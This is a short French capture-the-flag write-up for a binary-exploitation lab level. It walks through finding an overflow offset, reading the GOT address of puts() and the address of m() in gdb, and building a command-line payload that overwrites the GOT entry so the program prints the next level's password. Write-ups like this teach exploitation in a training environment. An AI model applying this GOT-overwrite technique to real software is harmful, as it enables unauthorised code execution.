### Level 7

#### Etape 01 :

On identifie la fonction importante : `m()`.

- `m()` affiche la variable `c`.
- Cette variable contient le `.pass` du level8 (rempli via `fgets` dans `main`).
- Le but est donc de forcer l'execution de `m()`.

#### Etape 02 :

La strategie consiste a faire une redirection via la GOT :

- remplacer l'entree GOT de `puts()` par l'adresse de `m()`,
- pour que l'appel a `puts()` execute en realite `m()`.

Pour cela, on ecrase l'adresse de la variable cible du `strcpy()` avec `argv[1]`.

#### Etape 03 :

On cherche l'offset avec `ltrace` :

```bash
ltrace ./level7 $(python -c 'print "e" * 23')
```

Apres analyse, l'offset correct est `20`.

#### Etape 04 :

On recupere l'adresse GOT de `puts()` :

```text
(gdb) info function puts
All functions matching regular expression "puts":
Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt

(gdb) disas 0x08048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:    jmp    *0x8049928
   0x08048406 <+6>:    push   $0x28
   0x0804840b <+11>:   jmp    0x80483a0
```

Adresse GOT de `puts()` : `0x08049928`.

#### Etape 05 :

On recupere l'adresse de `m()` :

```text
(gdb) disas m
0x080484f4 <+0>:    push   %ebp
0x080484f5 <+1>:    mov    %esp,%ebp
0x080484f7 <+3>:    sub    $0x18,%esp
0x080484fa <+6>:    movl   $0x0,(%esp)
0x08048501 <+13>:   call   0x80483d0 <time@plt>
```

Adresse de `m()` : `0x080484f4`.

#### Etape 06 :

On construit le payload final :

- `argv[1]` = 20 octets de padding + adresse GOT de `puts()`,
- `argv[2]` = adresse de `m()` a ecrire dans cette entree GOT.

```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

`puts()` est alors redirige vers `m()`, ce qui permet d'afficher le flag attendu.
